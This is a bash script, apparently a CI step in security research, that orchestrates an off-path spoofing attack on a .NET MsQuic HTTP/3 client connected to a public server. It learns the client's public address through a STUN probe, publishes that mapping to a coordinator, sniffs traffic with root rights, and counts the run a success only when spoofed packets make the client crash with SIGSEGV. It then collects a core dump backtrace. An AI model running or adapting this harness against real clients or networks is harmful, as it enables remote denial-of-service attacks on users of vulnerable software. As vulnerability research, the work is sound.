#!/usr/bin/env bash
set -Eeuo pipefail
ROOT="security-research/msquic-v2-retry-null-deref"
RESULTS="$GITHUB_WORKSPACE/msquic-public-peer-results/client"
APP="$ROOT/bin/Release/net10.0/MsQuicRetryE2E.dll"
HOST="cloudflare-quic.com"
LOCAL_PORT=45678
mkdir -p "$RESULTS"
export DOTNET_ROLL_FORWARD=LatestPatch
export LD_LIBRARY_PATH="$MSQUIC_LIB_DIR"

PEER_IP="$(python3 - "$HOST" <<'PY'
import socket,sys
answers=socket.getaddrinfo(sys.argv[1],443,socket.AF_INET,socket.SOCK_DGRAM)
print(answers[0][4][0])
PY
)"
python3 "$ROOT/stun-probe.py" "$LOCAL_PORT" > "$RESULTS/stun-mapping.json"
MAPPED_IP="$(jq -r .mapped_ip "$RESULTS/stun-mapping.json")"
MAPPED_PORT="$(jq -r .mapped_port "$RESULTS/stun-mapping.json")"
CLIENT_PUBLIC_IP="$(curl -4 -fsS https://api.ipify.org)"
printf '{"peer_host":"%s","peer_ip":"%s","peer_port":443,"client_public_ip":"%s","client_public_port":%d,"client_local_port":%d,"stun_mapping_consistent":true}\n' \
  "$HOST" "$PEER_IP" "$MAPPED_IP" "$MAPPED_PORT" "$LOCAL_PORT" > "$RESULTS/mapping.json"
cat "$RESULTS/mapping.json"

sudo sysctl -w kernel.core_pattern="$RESULTS/core.%e.%p" >/dev/null
ulimit -c unlimited
sudo python3 "$ROOT/internet-offpath-sniffer.py" "$PEER_IP" 443 "$RESULTS/spoof-received.txt" \
  >"$RESULTS/sniffer.log" 2>&1 &
SNIFFER_PID=$!
cleanup(){ set +e; kill "$SNIFFER_PID" 2>/dev/null; wait "$SNIFFER_PID" 2>/dev/null; }
trap cleanup EXIT

QUIC_REMOTE_IP="$PEER_IP" QUIC_LOCAL_PORT="$LOCAL_PORT" \
  dotnet "$APP" public-h3-client "$RESULTS/client-connected" >"$RESULTS/client.log" 2>&1 &
CLIENT_PID=$!
echo "CLIENT_PID=$CLIENT_PID"

for _ in $(seq 1 45); do
  if [ -s "$RESULTS/client-connected" ]; then break; fi
  if ! kill -0 "$CLIENT_PID" 2>/dev/null; then
    wait "$CLIENT_PID" || RC=$?
    cat "$RESULTS/client.log"
    echo "FAIL: .NET MsQuic client did not establish public QUIC connection"
    exit 1
  fi
  sleep 1
done
test -s "$RESULTS/client-connected" || { cat "$RESULTS/client.log"; echo "FAIL: no established public QUIC client"; exit 1; }
python3 "$ROOT/nettest-coord.py" publish "peer-mapping.json" "$RESULTS/mapping.json"

set +e
wait "$CLIENT_PID"
RC=$?
set -e
echo "$RC" > "$RESULTS/client-exit.txt"
echo "CLIENT_EXIT=$RC"
sleep 1
kill "$SNIFFER_PID" 2>/dev/null || true
wait "$SNIFFER_PID" 2>/dev/null || true
trap - EXIT

cat "$RESULTS/client.log"
cat "$RESULTS/sniffer.log" || true
cat "$RESULTS/spoof-received.txt" || true
CORE="$(find "$RESULTS" -maxdepth 1 -type f -name 'core.*' -print -quit || true)"
if [ -n "$CORE" ]; then
  gdb --batch --quiet -ex "set pagination off" -ex "set debuginfod enabled off" \
    -ex "thread apply all bt 24" -ex "info registers rax rbx rcx rdx rsi rdi rbp rsp rip" \
    -ex 'x/12i $pc-24' /usr/share/dotnet/dotnet "$CORE" > "$RESULTS/core-backtrace.txt" 2>&1 || true
fi

if [ "$RC" -eq 139 ] && [ -s "$RESULTS/spoof-received.txt" ]; then
  echo "PASS: public HTTP/3 peer tuple spoof reached client and MsQuic client SIGSEGV"
else
  echo "FAIL: public peer off-path proof incomplete (need exact spoof receive + exit 139)"
  exit 1
fi
